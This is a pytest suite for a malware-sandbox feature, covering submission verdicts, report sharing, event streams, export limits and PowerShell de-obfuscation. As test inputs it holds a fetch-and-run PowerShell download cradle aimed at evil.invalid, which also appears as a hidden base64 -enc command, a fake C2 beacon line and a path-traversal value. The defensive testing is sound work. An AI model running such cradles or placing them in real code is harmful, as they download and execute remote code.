"""Phase 6 malware sandbox: submission and verdict, report visibility and
team sharing, the behavior timeline and its SSE stream, the real static
pre-check's branches (EICAR / packed / clean), and export gating. The demo
detonator runs inline, so a submission returns already analyzed."""

import json

# EICAR anti-malware test string, split so this test file is not itself
# flagged by scanners. Reassembled at submit time.
EICAR = (
    "X5O!P%@AP[4\\PZX54(P^)7CC)7}$"
    + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
)


def _submit(client, headers, name, data: bytes):
    return client.post(
        "/api/v1/sandbox/samples",
        files={"file": (name, data)},
        headers=headers,
    )


def test_status_reports_demo_detonator(client, student):
    status = client.get("/api/v1/sandbox/status", headers=student).json()
    assert status["enabled"] is True
    assert status["detonator"] == "demo"
    assert status["live"] is False  # no isolated host in dev/test
    assert status["max_sample_mb"] == 100


def test_submit_eicar_reaches_malicious_verdict(client, student):
    resp = _submit(client, student, "eicar.com.txt", EICAR.encode())
    assert resp.status_code == 201, resp.text
    report = resp.json()
    # Inline queue: analysis is finished by the time we get the response.
    assert report["state"] == "completed"
    assert report["verdict"] == "malicious"
    assert report["family"] == "EICAR-Test-File"
    assert report["score"] == 100
    assert report["static"]["is_eicar"] is True
    assert "T1204.002" in report["mitre"]
    assert report["events"] > 0
    assert report["detonator"] == "demo"
    assert report["submitter_handle"] == "stud1"


def test_clean_verdict_for_benign_text(client, student):
    resp = _submit(
        client, student, "notes.txt", b"a benign note about blue team triage\n"
    )
    report = resp.json()
    assert report["state"] == "completed"
    assert report["verdict"] == "clean"
    assert report["static"]["is_eicar"] is False
    assert report["static"]["packed"] is False


def test_packed_payload_flags_suspicious(client, student):
    # Uniform bytes: entropy 8.0 bits/byte, over the packed threshold.
    payload = bytes(range(256)) * 16
    report = _submit(client, student, "packed.bin", payload).json()
    assert report["verdict"] == "suspicious"
    assert report["static"]["packed"] is True
    assert any("packed" in n or "entropy" in n for n in report["static"]["notes"])
    assert "T1027.002" in report["mitre"]


def test_embedded_iocs_are_extracted(client, student):
    sample = b"beacon config: http://evil.example.test/gate.php c2=185.220.101.5\n"
    report = _submit(client, student, "config.txt", sample).json()
    iocs = report["iocs"]
    assert "http://evil.example.test/gate.php" in iocs["urls"]
    assert "185.220.101.5" in iocs["ips"]
    assert "evil.example.test" in iocs["domains"]


def test_empty_submission_is_rejected(client, student):
    resp = _submit(client, student, "empty.bin", b"")
    assert resp.status_code == 422


def test_report_visibility_is_private_by_default(client, student, student2, admin):
    report = _submit(client, student, "eicar.com.txt", EICAR.encode()).json()
    rid = report["id"]

    # Owner sees it; a teammate does not (private by default); admin does.
    assert client.get(f"/api/v1/sandbox/reports/{rid}", headers=student).status_code == 200
    assert client.get(f"/api/v1/sandbox/reports/{rid}", headers=student2).status_code == 403
    assert client.get(f"/api/v1/sandbox/reports/{rid}", headers=admin).status_code == 200

    # The list endpoint is scoped the same way.
    mine = [r["id"] for r in client.get("/api/v1/sandbox/reports", headers=student).json()]
    assert rid in mine
    theirs = [r["id"] for r in client.get("/api/v1/sandbox/reports", headers=student2).json()]
    assert rid not in theirs

    # all_reports is admin-only.
    assert (
        client.get("/api/v1/sandbox/reports?all_reports=true", headers=student).status_code
        == 403
    )
    all_ids = [
        r["id"]
        for r in client.get(
            "/api/v1/sandbox/reports?all_reports=true", headers=admin
        ).json()
    ]
    assert rid in all_ids


def test_sharing_opens_report_to_team(client, student, student2):
    report = _submit(client, student, "sample.bin", b"share me\n").json()
    rid = report["id"]

    # A teammate cannot share someone else's report.
    assert (
        client.post(
            f"/api/v1/sandbox/reports/{rid}/share",
            json={"shared": True},
            headers=student2,
        ).status_code
        == 403
    )

    shared = client.post(
        f"/api/v1/sandbox/reports/{rid}/share", json={"shared": True}, headers=student
    ).json()
    assert shared["shared"] is True

    # Now the teammate (same tenant) can see it, in the list and directly.
    assert client.get(f"/api/v1/sandbox/reports/{rid}", headers=student2).status_code == 200
    theirs = [r["id"] for r in client.get("/api/v1/sandbox/reports", headers=student2).json()]
    assert rid in theirs

    # Closing sharing hides it again.
    client.post(
        f"/api/v1/sandbox/reports/{rid}/share", json={"shared": False}, headers=student
    )
    assert client.get(f"/api/v1/sandbox/reports/{rid}", headers=student2).status_code == 403


def test_event_timeline_and_sse_stream(client, student):
    report = _submit(client, student, "eicar.com.txt", EICAR.encode()).json()
    rid = report["id"]

    events = client.get(f"/api/v1/sandbox/reports/{rid}/events", headers=student).json()
    assert len(events) > 0
    assert [e["seq"] for e in events] == sorted(e["seq"] for e in events)
    assert events[0]["category"] == "system"
    assert any(e["category"] == "static" for e in events)  # pre-check findings
    assert any("verdict" in e["msg"] for e in events)  # completion line

    # The SSE stream replays the same rows and closes with the settled state.
    streamed, final_state = [], None
    with client.stream(
        "GET", f"/api/v1/sandbox/reports/{rid}/events/stream", headers=student
    ) as resp:
        assert resp.status_code == 200
        assert resp.headers["content-type"].startswith("text/event-stream")
        lines = list(resp.iter_lines())
    for i, line in enumerate(lines):
        if line.startswith("data: ") and (i == 0 or not lines[i - 1].startswith("event:")):
            streamed.append(json.loads(line[len("data: "):]))
        if line.startswith("event: state"):
            final_state = lines[i + 1][len("data: "):]
    assert len(streamed) == len(events)
    assert final_state == "completed"

    # Streams are visibility-gated exactly like the report.
    other = client.post(
        "/api/v1/auth/login",
        json={"email": "stud2@example.edu", "password": "test-password-123!"},
    ).json()["access_token"]
    denied = client.get(
        f"/api/v1/sandbox/reports/{rid}/events/stream",
        headers={"Authorization": f"Bearer {other}"},
    )
    assert denied.status_code == 403


def test_artifacts_listed_and_export_is_admin_only(client, student, teacher, admin):
    report = _submit(client, student, "eicar.com.txt", EICAR.encode()).json()
    rid = report["id"]

    artifacts = client.get(
        f"/api/v1/sandbox/reports/{rid}/artifacts", headers=student
    ).json()
    keys = [a["key"] for a in artifacts]
    assert f"{rid}/report.json" in keys

    # Students and teachers cannot export raw artifacts out of the platform.
    dl_path = f"/api/v1/sandbox/reports/{rid}/artifacts/download?key={rid}/report.json"
    assert client.get(dl_path, headers=student).status_code == 403
    assert client.get(dl_path, headers=teacher).status_code == 403

    # Admins can; the payload is the archived analysis JSON.
    ok = client.get(dl_path, headers=admin)
    assert ok.status_code == 200
    body = json.loads(ok.content)
    assert body["verdict"] == "malicious" and body["sha256"] == report["sample_sha256"]

    # Path traversal out of the report's own prefix is refused.
    bad = client.get(
        f"/api/v1/sandbox/reports/{rid}/artifacts/download?key=../isos/secret",
        headers=admin,
    )
    assert bad.status_code == 400


def test_resubmission_is_flagged(client, student, student2):
    payload = b"the very same bytes\n"
    first = _submit(client, student, "dup.bin", payload).json()
    assert first["resubmission"] is False
    second = _submit(client, student2, "dup.bin", payload).json()
    # Same SHA-256, a later run: the second submission is flagged.
    assert second["sample_sha256"] == first["sample_sha256"]
    assert second["resubmission"] is True


def test_sample_row_lands_before_the_run_that_references_it(client, student):
    """SandboxRun.sample_sha256 is a bare ForeignKey with no relationship()
    tying the two mappers together, so SQLAlchemy's unit of work has no
    dependency to sort on and falls back to mapper sort key — which orders
    SandboxRun *before* SandboxSample. PostgreSQL rejects that INSERT order
    with a ForeignKeyViolation; SQLite only hid it until db.py turned
    foreign key enforcement on."""
    from palestrix.db import SessionLocal
    from palestrix.models import SandboxRun, SandboxSample

    resp = _submit(client, student, "order.txt", b"insert ordering matters\n")
    assert resp.status_code == 201, resp.text
    report = resp.json()

    db = SessionLocal()
    try:
        run = db.get(SandboxRun, report["id"])
        assert run is not None
        # The referenced row must actually be there, not merely referenced.
        assert db.get(SandboxSample, run.sample_sha256) is not None
    finally:
        db.close()


def test_detonation_job_is_queued_with_its_own_timeout(client, student, monkeypatch):
    """RQ's default job timeout is 180s (rq.Queue.DEFAULT_TIMEOUT), shorter
    than a live detonation's boot grace plus window. Without an explicit
    timeout the worker is killed mid-run and the row is stranded in
    ``static`` forever, which the UI renders as permanently in flight."""
    from palestrix.config import get_settings
    from palestrix.orchestration import queue as queue_mod

    seen: dict = {}
    real = queue_mod.enqueue

    def spy(name, *, job_timeout=None, **kwargs):
        seen["name"] = name
        seen["job_timeout"] = job_timeout
        return real(name, job_timeout=job_timeout, **kwargs)

    monkeypatch.setattr(queue_mod, "enqueue", spy)
    assert _submit(client, student, "timeout.txt", b"benign\n").status_code == 201

    assert seen["name"] == "sandbox.detonate"
    assert seen["job_timeout"] is not None, "would inherit RQ's 180s default"
    assert seen["job_timeout"] > 180
    # The job is dominated by the one blocking call to the coordinator, so it
    # has to outlive that call's own timeout.
    assert seen["job_timeout"] > get_settings().sandbox_coordinator_timeout_seconds


# -- command-line submissions --------------------------------------------------


def _b64_utf16(text: str) -> str:
    import base64

    return base64.b64encode(text.encode("utf-16-le")).decode()


CRADLE = "IEX (New-Object Net.WebClient).DownloadString('http://evil.invalid/a.ps1')"


def _submit_command(client, headers, command: str):
    return client.post(
        "/api/v1/sandbox/commands",
        json={"command": command, "shell": "powershell"},
        headers=headers,
    )


def test_status_advertises_the_command_surface(client, student):
    status = client.get("/api/v1/sandbox/status", headers=student).json()
    assert status["shells"] == ["powershell"]
    assert status["max_command_chars"] > 0


def test_command_submission_produces_a_report(client, student):
    resp = _submit_command(client, student, "Get-Process | Select-Object Name")
    assert resp.status_code == 201, resp.text
    report = resp.json()
    assert report["state"] == "completed"
    assert report["filename"] == "command.ps1"
    assert report["media_type"] == "text/x-powershell"
    assert report["submitter_handle"] == "stud1"


def test_empty_command_is_rejected(client, student):
    assert _submit_command(client, student, "   ").status_code == 422


def test_oversized_command_is_rejected(client, student):
    from palestrix.config import get_settings

    too_long = "A" * (get_settings().sandbox_max_command_chars + 1)
    # Pydantic bounds it at the schema edge; either refusal is correct.
    assert _submit_command(client, student, too_long).status_code in (413, 422)


def test_identical_commands_dedup_to_one_sample(client, student):
    first = _submit_command(client, student, "Write-Host dedupe-me").json()
    second = _submit_command(client, student, "Write-Host dedupe-me").json()
    assert first["sample_sha256"] == second["sample_sha256"]
    assert first["id"] != second["id"]          # still its own run
    assert second["resubmission"] is True


def test_obfuscated_command_is_peeled_and_its_ioc_surfaces(client, student):
    """The C2 is not in the submitted text; only peeling reveals it."""
    submitted = f"powershell -nop -w hidden -enc {_b64_utf16(CRADLE)}"
    assert "evil.invalid" not in submitted

    report = _submit_command(client, student, submitted).json()
    assert report["state"] == "completed"
    assert "http://evil.invalid/a.ps1" in report["iocs"]["urls"]
    assert report["static"]["layers"], "decoded layers should be reported"
    assert any(CRADLE in layer for layer in report["static"]["layers"])


def test_peeler_handles_plain_and_nested_input():
    from palestrix.sandbox.analysis import peel_encoded_layers

    assert peel_encoded_layers("Get-Process") == []

    one = peel_encoded_layers(f"powershell -enc {_b64_utf16(CRADLE)}")
    assert len(one) == 1 and CRADLE in one[0]

    nested = _b64_utf16(f"powershell -enc {_b64_utf16(CRADLE)}")
    two = peel_encoded_layers(f"powershell -enc {nested}")
    assert len(two) == 2 and CRADLE in two[-1]


def test_peeler_ignores_base64_that_is_not_text():
    from palestrix.sandbox.analysis import peel_encoded_layers
    import base64

    blob = base64.b64encode(bytes(range(256)) * 4).decode()
    assert peel_encoded_layers(f"$x = '{blob}'") == []


def test_commands_require_the_submit_capability(client):
    assert _submit_command(client, {}, "Get-Process").status_code in (401, 403)
